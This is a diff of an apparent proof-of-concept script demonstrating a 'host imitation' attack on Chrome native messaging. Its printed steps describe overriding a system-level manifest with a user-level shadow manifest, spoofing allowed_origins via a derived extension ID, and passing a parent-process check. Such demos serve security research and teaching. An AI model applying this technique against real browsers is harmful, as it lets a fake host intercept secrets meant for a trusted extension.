@@ -36,11 +36,11 @@ STOLEN_LOG    = os.path.join(SCRIPT_DIR, ".host_imitation_stolen.log")
 def banner():
     print("\n" + "="*65)
     print("  ATTACK 2: HOST IMITATION")
-    print("  Fake NM host replaces real host — returns fabricated secret")
+    print("  Fake NM host replaces real host, returns fabricated secret")
     print("="*65)
 
-def defence(n, msg):
-    print(f"\n  Defence {n}: {msg}")
+def control(n, msg):
+    print(f"\n  Control {n}: {msg}")
 
 def step(n, title):
     print(f"\n  Step {n}: {title}")
@@ -126,13 +126,13 @@ def write_nm(pipe, msg):
 def run_setup():
     banner()
 
-    print("\n  Defences in place:")
-    defence(1, "The NM manifest is installed at the system level "
-               "(/Library/Google/Chrome/NativeMessagingHosts/) — "
+    print("\n  Controls in place:")
+    control(1, "The NM manifest is installed at the system level "
+               "(/Library/Google/Chrome/NativeMessagingHosts/), "
                "root-owned, requires administrator privileges to modify.")
-    defence(2, "The manifest lists allowed_origins — Chrome only forwards "
+    control(2, "The manifest lists allowed_origins, Chrome only forwards "
                "connections from the specific victim extension ID to this host.")
-    defence(3, "The demo victim host verifies its parent process is Google Chrome "
+    control(3, "The demo victim host verifies its parent process is Google Chrome "
                "before responding to any request.")
 
     pause()
@@ -147,7 +147,7 @@ def run_setup():
         info("System-level manifest not found. Run install.sh first.")
         sys.exit(1)
 
-    bypass("Bypassing Defence 1: the user-level NM directory is always writable — "
+    bypass("Bypassing Control 1: the user-level NM directory is always writable, "
            "a same-named file there silently overrides the system-level entry.")
 
     pause()
@@ -170,7 +170,7 @@ def run_setup():
     info(f"Public key (first 60 chars): {key_b64[:60]}...")
     info(f"Derived extension ID:        {ext_id}")
 
-    bypass("Bypassing Defence 2: shadow manifest sets allowed_origins to the derived ID — "
+    bypass("Bypassing Control 2: shadow manifest sets allowed_origins to the derived ID, "
            "Chrome routes the victim extension's connection to our fake host.")
 
     info("")
@@ -187,10 +187,10 @@ def run_setup():
     info(f"Shadow manifest: {SHADOW_MANIFEST}")
     info(f"Points to:       {wrapper_sh}")
     info("")
-    info("Chrome spawns the fake host directly — Chrome is its parent, so the")
+    info("Chrome spawns the fake host directly, Chrome is its parent, so the")
     info("parent check passes without spoofing.")
 
-    bypass("Bypassing Defence 3: Chrome is the real parent — no spoofing needed.")
+    bypass("Bypassing Control 3: Chrome is the real parent, no spoofing needed.")
 
     def cleanup(sig=None, frame=None):
         print("\n\n  Cleaning up...")
